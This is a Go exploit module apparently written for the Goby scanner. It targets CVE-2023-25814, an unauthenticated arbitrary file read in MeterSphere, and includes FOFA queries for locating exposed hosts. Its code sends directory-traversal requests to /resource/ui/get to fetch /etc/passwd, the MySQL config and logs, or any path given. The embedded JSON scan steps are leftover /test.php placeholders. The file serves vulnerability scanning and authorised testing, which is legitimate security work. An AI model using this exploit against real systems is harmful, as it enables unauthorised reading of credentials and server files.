package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "MeterSphere resource/ui/get file reading vulnerability (CVE-2023-25814)",
    "Description": "<p>MeterSphere is a one-stop open source continuous testing platform, covering functions such as test tracking, interface testing, UI testing and performance testing, and is fully compatible with mainstream open source standards such as JMeter and Selenium.</p><p>MeterSphere has an unauthorized arbitrary file read vulnerability. Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.</p>",
    "Product": "FIT2CLOUD-MeterSphere",
    "Homepage": "https://github.com/metersphere/metersphere",
    "DisclosureDate": "2023-03-09",
    "Author": "sunying",
    "FofaQuery": "title=\"MeterSphere\" || header=\"MS_SESSION_ID\" || banner=\"MS_SESSION_ID\"",
    "GobyQuery": "title=\"MeterSphere\" || header=\"MS_SESSION_ID\" || banner=\"MS_SESSION_ID\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://github.com/metersphere/metersphere\">https://github.com/metersphere/metersphere</a></p>",
    "References": [
        "https://github.com/metersphere/metersphere/security/advisories/GHSA-fwc3-5h55-mh2j"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "../../../../../../../../../../opt/metersphere/conf/my.cnf",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2023-25814"
    ],
    "CNNVD": [
        "CNNVD-202303-689"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.1",
    "Translation": {
        "CN": {
            "Name": "MeterSphere resource/ui/get 文件读取漏洞（CVE-2023-25814）",
            "Product": "FIT2CLOUD-MeterSphere",
            "Description": "<p>MeterSphere 是一站式开源持续测试平台, 涵盖测试跟踪、接口测试、UI 测试和性能测试等功能，全面兼容 JMeter、Selenium 等主流开源标准。</p><p>MeterSphere 存在未授权任意文件读取漏洞。攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/metersphere/metersphere\">https://github.com/metersphere/metersphere</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br><br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "MeterSphere resource/ui/get file reading vulnerability (CVE-2023-25814)",
            "Product": "FIT2CLOUD-MeterSphere",
            "Description": "<p>MeterSphere is a one-stop open source continuous testing platform, covering functions such as test tracking, interface testing, UI testing and performance testing, and is fully compatible with mainstream open source standards such as JMeter and Selenium.</p><p>MeterSphere has an unauthorized arbitrary file read vulnerability.&nbsp;<span style=\"color: rgb(22, 28, 37); font-size: 16px;\">Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.</span></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://github.com/metersphere/metersphere\">https://github.com/metersphere/metersphere</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-27",
    "PocId": "10766"
}`

	sendReadFilePayloadYFw3quGR := func(hostInfo *httpclient.FixUrl, filePath string) (*httpclient.HttpResponse, error) {
		if !strings.HasSuffix(filePath, "./") {
			filePath = "./" + filePath
		}
		lastIndex := strings.LastIndex(filePath, "/")
		if lastIndex == -1 || len(filePath)-1 == lastIndex {
			return nil, errors.New("漏洞利用失败")
		}
		filename := filePath[lastIndex+1:]
		folder := filePath[:lastIndex+1]
		readFileConfig := httpclient.NewGetRequestConfig("/resource/ui/get?fileName=" + filename + "&reportId=" + folder)
		readFileConfig.VerifyTls = false
		readFileConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, readFileConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			for _, filePath := range []string{"etc/passwd", "opt/metersphere/conf/my.cnf", "opt/metersphere/logs/metersphere/error.log"} {
				resp, err := sendReadFilePayloadYFw3quGR(hostInfo, "../../../../../../../../../../"+filePath)
				if err != nil {
					return false
				} else if resp.StatusCode == 200 && (strings.Contains(resp.Utf8Html, "root:") || strings.Contains(resp.Utf8Html, "[mysqld]") || strings.Contains(resp.Utf8Html, "] ERROR ")) {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := goutils.B2S(stepLogs.Params["filePath"])
			respExp, errExp := sendReadFilePayloadYFw3quGR(expResult.HostInfo, filePath)
			if errExp != nil {
				expResult.Success = false
				expResult.Output = errExp.Error()
			} else if respExp.StatusCode == 200 {
				expResult.Success = true
				expResult.Output = respExp.RawBody
			} else {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
			}
			return expResult
		},
	))
}
